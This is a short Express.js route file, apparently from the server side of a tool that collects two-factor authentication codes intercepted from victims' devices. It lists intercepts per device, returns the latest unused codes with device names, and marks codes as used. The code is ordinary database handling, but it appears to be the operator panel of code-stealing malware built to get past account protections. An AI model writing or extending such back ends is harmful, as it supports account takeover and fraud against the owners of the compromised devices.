const express = require('express');
const router = express.Router();
const db = require('../utils/db');
const { authMiddleware } = require('../utils/auth');

router.get('/device/:deviceId', authMiddleware, async (req, res) => {
  const result = await db.query(
    `SELECT * FROM tfa_intercepts WHERE device_id = (SELECT id FROM devices WHERE device_id = $1) 
     ORDER BY intercepted_at DESC`,
    [req.params.deviceId]
  );
  res.json(result.rows);
});

router.get('/latest', authMiddleware, async (req, res) => {
  const result = await db.query(
    `SELECT t.*, d.device_name, d.device_id as did FROM tfa_intercepts t
     JOIN devices d ON t.device_id = d.id WHERE t.used = false ORDER BY intercepted_at DESC LIMIT 50`
  );
  res.json(result.rows);
});

router.post('/mark-used/:id', authMiddleware, async (req, res) => {
  await db.query('UPDATE tfa_intercepts SET used = true WHERE id = $1', [req.params.id]);
  res.json({ updated: true });
});

module.exports = router;
